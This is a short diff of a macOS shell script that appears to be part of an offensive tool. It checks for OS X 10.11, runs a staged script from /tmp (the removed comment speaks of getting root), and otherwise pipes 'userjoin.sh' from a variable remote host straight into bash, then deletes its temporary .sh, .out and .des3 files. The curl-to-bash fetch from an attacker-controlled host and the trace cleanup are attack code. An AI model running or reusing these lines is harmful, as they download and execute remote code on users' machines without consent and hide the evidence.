@@ -17,10 +17,9 @@ if [[ $(defaults read loginwindow SystemVersionStampAsString) = "10.11."* ]] &&
 /tmp/enact.sh
 EOF
 
+else
+    curl -L $host:$down_port/mac/userjoin.sh |bash
 fi
-
-# If something went wrong, join the user without getting root.
-if [ ! -f /tmp/exp.out ]; then curl -L $host:$down_port/mac/userjoin.sh |bash; fi
 
 rm -f /tmp/*.{sh,out,des3}
 
